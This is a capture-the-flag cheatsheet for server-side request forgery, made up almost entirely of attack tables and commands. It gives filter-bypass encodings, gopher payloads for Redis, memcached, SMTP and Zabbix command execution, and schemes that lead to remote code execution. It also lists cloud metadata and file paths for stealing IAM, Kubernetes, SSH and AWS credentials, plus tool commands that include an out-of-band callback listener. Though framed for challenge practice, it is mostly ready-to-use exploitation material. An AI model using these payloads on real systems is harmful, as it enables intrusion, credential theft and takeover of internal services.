# Cheatsheet — the field-manual tables

The dense reference — the tables you actually reach for mid-
challenge.

---

## The first-10 probe table

```text
1. url=http://127.0.0.1:1/         refused-error → fetch confirmed
2. url=http://127.0.0.1:<port>/    the app's own port → loopback-route
3. url=http://CANARY/              the callback → egress + fetcher-UA
4. url=file:///etc/passwd          file-read → the fs-primitive
5. url=http://169.254.169.254/     the metadata → cloud-shape
6. url=http://127.0.0.1:6379/      redis → open?
7. url=gopher://127.0.0.1:6379/_PING → gopher → +PONG
8. url=http://localhost/           the hostname-form → parser
9. url=http://0x7f000001/          the hex-ip → the check-type
10. url=http://127.0.0.1:<port>/flag → the flag-route
```

## The check-type → bypass table

```text
check says              → bypass-family
"contains 127"           → 2130706433 / 0x7f000001 / 0177.0.0.1 / 127.1 /
                           [::1] / 127.0.0.1.nip.io
"host must be X"         → X@internal / internal@X — the two-parser @
"must end with .X"       → attacker.com/.X — the suffix-in-path
"must start with http"   → HtTp:// / http:\ / whitespace-prefix
"scheme must be http"    → the scheme-table — which-else-allowed
"no private ip"          → dns-rebind — the resolve-twice
"no redirects"           → (dead — pivot — per-hop-validation)
"resolve check passes"   → fetch-time-check → rebind-or-nothing
```

## The port → service → chain table

```text
22     ssh      — banner-grab only — "SSH-2.0-…"
25     smtp     — gopher→HELO/MAIL — send-internal-mail
53     dns      — udp — unreachable via tcp-fetch
80     web      — the internal-web — the route-wordlist
110    pop3     — gopher→USER/RETR — read-mail
143    imap     — gopher→LOGIN/FETCH — read-mail
443    https    — the internal-tls
631    cups     — http-ipp — /printers /jobs
2375   docker   — the api → container-spawn → host-mount → flag
2379   etcd     — /v2/keys/?recursive — k8s-secrets
2380   etcd-peer
3000   grafana/dev — /api/health — admin:admin
3306   mysql    — banner-fingerprint only
4040   spark-ui — /environment — env-vars!
5000   flask/dev — the alt-web — /console?
5432   postgres — fingerprint only
5601   kibana   — /app/dev_tools — es-console
5672   rabbitmq — amqp binary
5984   couchdb  — /_all_dbs → /db/_all_docs?include_docs
6379   redis    — THE target — KEYS/GET/EVAL/webroot-write
7001   weblogic — /console
8000   django/dev — the alt-web
8009   ajp      — Ghostcat — tomcat-LFI-via-ajp
8025   mailhog  — /api/v2/messages — the mail-inbox!
8080   weblogic?/tomcat/jenkins-alt — /manager/html
8081   spring-actuator — /actuator/env
8086   influxdb — /query?q=show+databases
8088   yarn-rm  — /ws/v1/cluster/apps
8161   activemq — /admin — admin:admin
8500   consul   — /v1/kv/?recurse — the kv-secrets
8888   jupyter  — /tree — RCE-via-kernel!
9000   php-fpm  — gopher→fcgi → auto_prepend → RCE
9001   supervisord — xmlrpc — supervisor.rpc
9090   prometheus — /api/v1/query
9093   alertmanager
9100   node-exporter — /metrics
9200   elasticsearch — /_all/_search?pretty — the dump!
9411   zipkin   — /api/traces — flag-in-a-trace
9990   wildfly  — /management
10050  zabbix   — gopher→system.run[id]
11211  memcached — stats/cachedump/get flag
15672  rabbitmq-mgmt — /api/queues — guest:guest on loopback
27017  mongo    — binary — fingerprint
28017  mongo-http — the old-httpinterface
50070  hadoop   — /webhdfs/v1/?op=LISTSTATUS
```

## The scheme → reach table

```text
http://    — everything — the default
https://   — the tls-fetch
file://    — the filesystem — the flag-paths — the read
gopher://  — raw-tcp — redis/memcached/smtp/fcgi/zabbix — the line-
             and-record-protocols
dict://    — the text-protocols — redis/memcached the easy-form
ftp://     — ftp-read — limited
tftp://    — udp-tftp — rarely
sftp://    — ssh-fs — needs creds
ldap://    — the directory — anonymous-ldap
telnet://  — raw-interactive
imap://    — the imap-fetcher
smtp://    — the smtp-fetcher
jar://     — java — inside-a-jar
netdoc://  — java — file-alias
php://     — php-filter — the filter-grammar — read-anything-as-b64
expect://  — php — direct-RCE
data://    — inline-content — data:// + include → RCE
ogg://tlv://rtsp://rtmp:// — curl-stream-schemes — niche
http+unix:// — docker-socket — the unix-fetch
ws://wss:// — websockets — the ws-internal
```

## The metadata → flag-path table

```text
aws      → /latest/user-data  /latest/meta-data/iam/security-credentials/<role>
gcp      → /computeMetadata/v1beta1/.../attributes/startup-script
           + .../service-accounts/default/token + kube-env
azure    → /metadata/identity/oauth2/token?resource=...
do       → /metadata/v1/user-data  /metadata/v1.json
alibaba  → /latest/user-data  /latest/meta-data/ram/security-credentials/
ecs      → 169.254.170.2/v2/metadata + the creds-relative-uri
k8s      → file:///var/run/secrets/kubernetes.io/serviceaccount/token
           → the api with the token → secrets
openstack→ /openstack/latest/meta_data.json  /user_data
```

## The gopher command-table

```text
redis:
  _PING                      the alive-probe
  _INFO                      the dump
  _KEYS%20*                  the inventory
  _GET%20flag                the key
  _EVAL%20%22return%20redis.call%28%27get%27%2C%27flag%27%29%22%200
                             the lua-read
  _CONFIG%20GET%20dir        the workdir
  _CONFIG%20SET%20dir%20/x   the write-path-set
  _SET%20x%20y               the write
  _SAVE                      the persist — the file-write
memcached:
  _stats / _stats%20items / _stats%20cachedump%201%20100
  _get%20flag / _set%20x%200%200%20n%0d%0aval%0d%0a
  _lru_crawler%20metadump%20all
smtp:
  _HELO%20x%0d%0aMAIL%20FROM:%3ca@b%3e%0d%0aRCPT%20TO:%3cc@d%3e%0d%0aDATA…
zabbix:
  _system.uname / _system.run[id] / _vfs.file.contents[/flag]
zookeeper:
  _srvr / _stat / _cons / _dump / _envi / _ruok
http-through-gopher:
  _GET%20/admin%20HTTP/1.1%0d%0aHost:%20x%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0a%0d%0a
```

## The file:// flag-path table

```text
flag-shapes:   /flag /flag.txt /app/flag /root/flag /var/www/flag
               /proc/self/cwd/flag /home/*/flag
env:           /proc/self/environ /proc/1/environ
self-map:      /proc/self/maps /proc/self/cgroup /proc/self/cmdline
               /proc/net/tcp /proc/net/arp /proc/net/fib_trie
               /proc/net/unix
config:        /app/.env /app/config.* /etc/nginx/* /etc/apache2/*
               /var/www/html/wp-config.php
creds:         /root/.aws/credentials /root/.kube/config
               /var/run/secrets/kubernetes.io/serviceaccount/token
               /root/.ssh/id_rsa /root/.bash_history
logs:          /var/log/*/access.log — the internal-route hints
windows:       C:/flag.txt C:/inetpub/wwwroot/web.config
               C:/Windows/Panther/Unattend.xml C:/Windows/repair/SAM
```

## The tool → command table

```bash
# the port-map
python3 tools/web/ssrf_probe.py --url "$BASE/fetch" --param url \
  --method POST --ports 22,80,6379,9200,11211,2375,8500 --timeout 4

# a gopher-redis-url
python3 tools/web/gopher_gen.py redis --cmd \
  "EVAL 'return redis.call(\"get\",\"flag\")' 0"

# the callback-server
python3 tools/web/oob_listener.py serve --port 9000 &
python3 tools/web/oob_listener.py canary --base http://YOU:9000 --name p1
python3 tools/web/oob_listener.py hits

# the response-bound probe
python3 tools/web/http_probe.py --challenge $C --class web-ssrf \
  --url "$BASE/fetch" --method POST --body 'url=http://127.0.0.1:1/' \
  --evidence-regex 'refused' --evidence-kind class \
  --on-match confirms --on-miss inconclusive

# the file-path walk
python3 tools/web/read_loop.py --url "$BASE/fetch" --method POST \
  --body 'url=file://{path}' --profile flags

# the encoding-differential
python3 tools/web/sanitizer_fuzz.py --url "$BASE/fetch" --field url \
  --forbidden '127' --callable '2130706433' --max-cases 40
```

## The evidence-level table

```text
surface  → the param exists — never confirms
class    → the server dialled — refused-error / callback /
           differential — confirms web-ssrf
impact   → internal-content read — the flag-bytes / the metadata /
           the internal-route — the solve
the substring-binding: the evidence-quote must appear verbatim in
the response — http_probe binds them
```

## The falsifier table

```text
no fetch                  → not-ssrf — the param isn't fetched —
                            different-class
fetch but only-external   → egress-only-fetch — no-internal —
                            the flag isn't inside — different-target
internal but no-echo      → pure-blind — the state-write or
                            escalation-only
all-internal-blocked      → airtight — rebind-or-nothing — the
                            last door is the resolve-twice race
the url renders only      → templated-echo — not-a-fetch —
                            different class
```
